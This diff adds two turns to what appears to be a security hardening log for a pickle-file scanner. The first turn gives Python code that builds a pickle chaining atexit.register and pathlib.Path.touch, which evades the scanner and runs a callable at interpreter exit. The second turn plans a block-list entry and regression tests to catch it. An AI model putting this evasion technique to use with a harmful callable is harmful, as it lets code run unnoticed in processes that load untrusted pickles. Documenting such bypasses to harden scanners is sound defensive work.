@@ -1199,3 +1199,91 @@ Blocking plan:
 Performance note: the fix adds one tuple to a sorted static table checked with
 binary search. It does not add iterable-flow analysis or broader string
 scanning.
+
+## Turn 31 - `atexit.register` exit-time callback gap
+
+Goal: produce a more aggressive RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_atexit_register_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("atexit", "register"),
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_atexit_register_marker"),
+        b"tR",
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `atexit.register`, `pathlib.Path.touch`, and `pathlib.PosixPath`, all with
+  `is_dangerous=False`
+- Unpickle result: registers `pathlib.Path.touch(marker)` as an exit handler
+  without creating the marker immediately
+- Exit-time result: when Python runs exit handlers, the registered callback
+  creates `/tmp/ma_atexit_register_marker`
+- RCE mechanism: `atexit.register()` stores an attacker-selected callable and
+  attacker-controlled arguments for execution at interpreter shutdown. The
+  unpickle operation arms the callback inside the host process, so the payload
+  can survive a clean deserialization path and execute later when the process
+  exits.
+
+Why the scanner missed it:
+
+- `atexit` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `atexit.register`,
+  `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is a delayed arbitrary-call sink, not a parsing miss.
+The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
+`("atexit", "register")`, plus a regression that verifies scanner detection
+before proving that the registered callback fires at exit. The hot path remains
+a static policy lookup with no callback-flow simulation.
+
+## Turn 32 - Block `atexit.register`
+
+Blocking plan:
+
+- Add `("atexit", "register")` to the sorted Rust `DANGEROUS_GLOBALS` table.
+  `pathlib.Path.touch` stays allowed because the arbitrary-call sink is
+  `atexit.register`; the callback is attacker-selected data passed to that
+  sink.
+- Add portable policy coverage for raw `GLOBAL atexit register` reductions so
+  detection does not depend on executing the stdlib function.
+- Add a CPython oracle regression that manually builds
+  `atexit.register(pathlib.Path.touch, marker)`, verifies scanner detection,
+  then runs the payload in a child Python process and proves the marker appears
+  when interpreter exit handlers fire.
+
+Performance note: the fix adds one tuple to a sorted static table checked with
+binary search. It does not add exit-handler simulation, callback-flow analysis,
+or broader string scanning.
